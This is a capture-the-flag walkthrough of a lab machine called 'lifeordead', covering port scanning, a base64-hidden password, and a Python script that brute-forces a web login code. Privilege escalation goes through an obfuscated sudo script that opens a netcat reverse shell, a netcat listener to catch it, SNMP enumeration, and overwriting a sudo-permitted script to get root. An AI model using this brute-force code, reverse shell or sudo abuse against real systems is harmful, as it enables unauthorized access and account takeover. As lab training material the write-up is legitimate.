![Screenshot](/hard/lifeordead/Images/machine.png)

Difficulty: **hard**

Made by: **d1se0**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

First of all we make sure the machine is up, we can do this with the command **ping**

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.222 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.154 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.094 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2043ms
rtt min/avg/max/mdev = 0.094/0.156/0.222/0.052 ms
```

Now, we can start our **reconnaissance** phase.

---
# Reconnaissance

We can start our reconnaissance with **nmap** to see what ports are open in the target.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2 -oG ports
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-12 00:25 -05
Initiating ARP Ping Scan at 00:25
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 00:25, 0.18s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:25
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 00:25, 3.88s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000030s latency).
Scanned at 2025-12-12 00:25:51 -05 for 4s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.42 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

When the scan concludes we can see that are 2 ports open:

- port 22 (ssh / secure shell)
- port 80 (http / Hyper-Text transfer protocol)

But we need to know more about these 2 ports like what services are using into.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ nmap -p22,80 -sCV 172.17.0.2 -oX target --stats-every=1m
```

**-p22,80** <- With this argument nmap will only scan this 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

**--stats-every=1m** <- With this argument we receive stats of the scan every 1 minute, this can have minutes (m) and seconds (s)

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ open target.html 
```

And we can see this in our browser.

![Screenshot](/hard/lifeordead/Images/image1.png)

It's way more clean and readable, and we can see that the port 80 it's a website, let's take a look.

![Screenshot](/hard/lifeordead/Images/image2.png)

It's a default website, we can try to see the source code , sometimes can hide content inside.

```css
div.page_header {
height: 180px;
width: 100%;

background-color: #F5F6F7;
background-color: UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU;
}
```

If we notice the value of the background-color it's weird, his value is encoded in base64, we can decode it and let's see what it's inside.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ echo "UEFTU1dPUkRBRE1JTlNVUEVSU0VDUkVU" | base64 -d
PASSWORDADMINSUPERSECRET
```

We can see this password but also are something else in the source code of the website.

```html
<div class="validator" hidden="lifeordead.dl">
```

This is virtual hosting, let's change our **/etc/hosts** file to save this domain.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/enumeration]
└─$ head -n 1 /etc/hosts 
172.17.0.2      lifeordead.dl
```

Okay so let's open our browser to open this domain.

![Screenshot](/hard/lifeordead/Images/image3.png)

We can see a login page but remember that we got the password of the user admin before, let's see if it works.

![Screenshot](/hard/lifeordead/Images/image4.png)

And we can see this, it seems we need a number of 4 digits to enter, but before doing some brute force we can take a quick look into the source code of the page.

And we can see this:

```
<!--dimer-->
```

Is a comment, probably is a user or something like that.

Okay so let's try to intercept the request of the website and see how the data is send.

```python
POST /pageadmincodeloginvalidation.php HTTP/1.1
Host: lifeordead.dl
Content-Length: 139
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryq8lPdmdy189xvAuQ
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Origin: http://lifeordead.dl
Referer: http://lifeordead.dl/pageadmincodelogin.html
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=u1tcgtrhjo8rb0lu28bmjnc6e1
Connection: keep-alive

------WebKitFormBoundaryq8lPdmdy189xvAuQ
Content-Disposition: form-data; name="code"

1234
------WebKitFormBoundaryq8lPdmdy189xvAuQ--
```

And we can see this making a POST request to **/pageadmincodeloginvalidation.php** and submitting the code as a WebKitFormBoundary type, this is import to know to make our exploit.

And let's intercept also the response of the website.

We receive this:

```python
HTTP/1.1 200 OK
Date: Fri, 12 Dec 2025 22:32:09 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 50
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":"failed","attempts":9,"remainingTime":0}
```

And we can see that the data of response it's a type of json, now let's see what happens if we run out of attempts.

```python
HTTP/1.1 200 OK
Date: Fri, 12 Dec 2025 22:36:36 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 53
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":"blocked","remainingTime":23,"attempts":10}
```

We can see that the status change to **"blocked"**, so with all of this information we can try to make our own exploit to do some brute force of the website to find what the correct code is.

Let's make it with python.

---
# Exploitation

I made this python script to brute force the code number starting with 0000 to 9999:

```python
from pwn import *
from requests_toolbelt import MultipartEncoder
import requests
import random
import string
import json

target = "http://lifeordead.dl/pageadmincodeloginvalidation.php"

def send_request(num):
        fields = {
                "code": f"{num:04d}"
        }

        bound = "----WebKitFormBoundary" + "".join(random.sample(string.ascii_letters + string.digits, 16))
        payload = MultipartEncoder(fields=fields, boundary=bound)

        heads = {
                "Content-Type": payload.content_type
        }

        response = requests.post(url=target, headers=heads, data=payload)
        data = json.loads(response.text)

        return data["status"]


with log.progress("Bruteforcing the code number...") as bar:
        for num in range(10000):

                bar.status(f"Trying with the code: {num:04d}")

                status = send_request(num)

                if status != "failed" and status != "blocked":
                        bar.success(f"PWNED! The code number is: {num:04d}")
                        break

        bar.failure("Can't get the code number T_T")

```

And we are taking advantage that the website doesn't require a cookie to verify if the traffic is legit.

So after a couple of seconds we get the code to login!

```
┌──(mike)─(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ python3 exploit.py 
[+] Bruteforcing the code number...: PWNED! The code number is: [REDACTED]
```

So after we found out the code, let's verify if it works.

![Screenshot](/hard/lifeordead/Images/image5.png)

So we got the password to login somewhere, let's see if with ssh we can login as the user **dimer** if we remember before and with this password.

```
┌──(mike)─(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ ssh dimer@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:ndOnZVaYzMdjJB/SAr+N1b0VbsZjgS+/hqKHCviYNyo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
dimer@172.17.0.2's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.17.10+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dimer@dockerlabs:~$
```

And we are in!

---
# Privilege Escalation

Before doing privilege escalation, we need to do some lateral movement before escalate our privileges.

We see that we have privileges with **SUDOERS**

```
dimer@dockerlabs:~$ sudo -l
Matching Defaults entries for dimer on dockerlabs:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dimer may run the following commands on dockerlabs:
    (bilter : bilter) NOPASSWD: /opt/life.sh
```

We can see that we can execute this bash script as the user **bilter**

Let's take a look into the code.

```python
#!/bin/bash

set +m

v1=$((0xCAFEBABE ^ 0xAC1100BA))
v2=$((0xDEADBEEF ^ 0x17B4))

a=$((v1 ^ 0xCAFEBABE))
b=$((v2 ^ 0xDEADBEEF))

c=$(printf "%d.%d.%d.%d" $(( (a >> 24) & 0xFF )) $(( (a >> 16) & 0xFF )) $(( (a >> 8) & 0xFF )) $(( a & 0xFF )))

d=$((b))

e="nc"
f="-e"
g=$c
h=$d

$e $g $h $f /bin/bash &>/dev/null &
```

It seems it's obfuscated and it's hard to read. But we can see that this script uses netcat and also executes **bash** like a backdoor, we can try to execute it and see what ports are open inside of the machine.

In this system doesn't have the command **ss** but it have **netstat**.

if we execute the bash script and then quickly execute **netstat** to take a look what is happening.

```
dimer@dockerlabs:~$ sudo -u bilter /opt/life.sh
dimer@dockerlabs:~$ netstat -aon
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      1 172.17.0.2:52710        172.17.0.186:6068       SYN_SENT    on (0.26/0/0)
tcp        0    256 172.17.0.2:22           172.17.0.1:53496        ESTABLISHED on (0.21/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  3      [ ]         STREAM     CONNECTED     81416    
unix  2      [ ]         STREAM     CONNECTED     82011    
unix  3      [ ]         STREAM     CONNECTED     81417
```

We can see that the local machine sends a request to the ip address **172.17.0.186** to the port **6068** if we remember what the script does, it establishes a connection with **netcat** and execute **bash**, in summary making a reverse shell.

So we need to make this IP address to receive the connection.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ sudo ip addr add 172.17.0.186/16 dev docker0
```

So we create in our own attack machine this IP address to receive the connection.

And also let's be in listen mode to receive any connection with **netcat**

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ nc -lvp 6068 -s 172.17.0.186
172.17.0.186: inverse host lookup failed: Unknown host
listening on [172.17.0.186] 6068 ...
```

After we are in listen mode, let's execute the bash script to receive the shell.

```
dimer@dockerlabs:~$ sudo -u bilter /opt/life.sh
```

So when we execute this we receive a shell as the user **bilter**

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ nc -lvp 6068 -s 172.17.0.186
172.17.0.186: inverse host lookup failed: Unknown host
listening on [172.17.0.186] 6068 ...
connect to [172.17.0.186] from lifeordead.dl [172.17.0.2] 36374
whoami
bilter
```

Okay so Im going to make this a better shell to work with.

First of all we do this:

```
script /dev/null -c bash
Script started, output log file is '/dev/null'.
bilter@dockerlabs:/home/dimer$
```

This command makes a new bash session with **script** and **/dev/null** asthe output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of the bash.

When we execute this, we suspend our reverse shell for a moment.

then we execute the next command in our attack machine:

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```
bilter@dockerlabs:/home/dimer$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```
bilter@dockerlabs:/home/dimer$ stty rows {num} columns {num}
```

and finally it looks way better!

After doing this, once again we have a **SUDOER** privilege.

```
bilter@dockerlabs:~$ sudo -l
Matching Defaults entries for bilter on dockerlabs:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bilter may run the following commands on dockerlabs:
    (ALL : ALL) NOPASSWD: /usr/local/bin/dead.sh
```

We can execute this **bash** script as **any** user even with the user **root**, but if we look the permissions about this script bash.

```
bilter@dockerlabs:~$ ls -l /usr/local/bin/dead.sh
--wx--x--x 1 root root 182 Jan 20  2025 /usr/local/bin/dead.sh
```

Only we can execute it, not even take a look!

So let's see what happens.

```
bilter@dockerlabs:~$ sudo /usr/local/bin/dead.sh
161
```

Only the output is this number **161**, and nothing else does this script, doesn't change anything on the system.

After a loooong time searching we can find something interesting, if we scan this number as a port with nmap.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ nmap -sU -p161 -sCV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-12 20:08 -05
Nmap scan report for lifeordead.dl (172.17.0.2)
Host is up (0.0034s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-sysdescr: Linux dockerlabs 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64
|_  System uptime: 5m47.35s (34735 timeticks)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 7f3cbe5245328e6700000000
|   snmpEngineBoots: 12
|_  snmpEngineTime: 5m47s
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: dockerlabs

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.32 seconds
```

We can see that this port is open, so we can enumerate a little bit of this port with **snmpwalk**

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ snmpwalk -c public -v 1 172.17.0.2
iso.3.6.1.2.1.1.1.0 = STRING: "Linux dockerlabs 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (118699) 0:19:46.99
iso.3.6.1.2.1.1.4.0 = STRING: "Me <admin@lifeordead.dl>"
iso.3.6.1.2.1.1.5.0 = STRING: "dockerlabs"
iso.3.6.1.2.1.1.6.0 = STRING: "This port must be disabled aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw="
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
```

So we can notice another message here encoded in base64, let's decode it.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/lifeordead/exploits]
└─$ echo "aW1wb3NpYmxlcGFzc3dvcmR1c2VyZmluYWw=" | base64 -d
[REDACTED]
```

So once we have the password let's login as the user **purter**

```
dimer@dockerlabs:~$ su purter
Password: 
purter@dockerlabs:/home/dimer$
```

And again we got another SUDOER privilege.

```
purter@dockerlabs:~$ sudo -l
Matching Defaults entries for purter on dockerlabs:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User purter may run the following commands on dockerlabs:
    (ALL : ALL) NOPASSWD: /home/purter/.script.sh
```

But we can make delete this bash script because we are in our home directory, so let's make our own bash script to receive a shell as the user **root** to escalate our privileges!

So this is our new bash script:

```bash
purter@dockerlabs:~$ cat .script.sh 
#!/bin/bash

bash
```

Once we save our own bash script we give them permissions to execute with **chmod**

```
purter@dockerlabs:~$ chmod +x .script.sh
```

After all of this we can receive a shell as the user root!

Now let's execute it.

```
purter@dockerlabs:~$ sudo /home/purter/.script.sh 
root@dockerlabs:/home/purter#
```

So we are root now, we can see the flag.

```
root@dockerlabs:/home/purter# cat /root/root.txt 
e04292d1067e92530c22e87ebfc87d28
```

***...pwned..!***
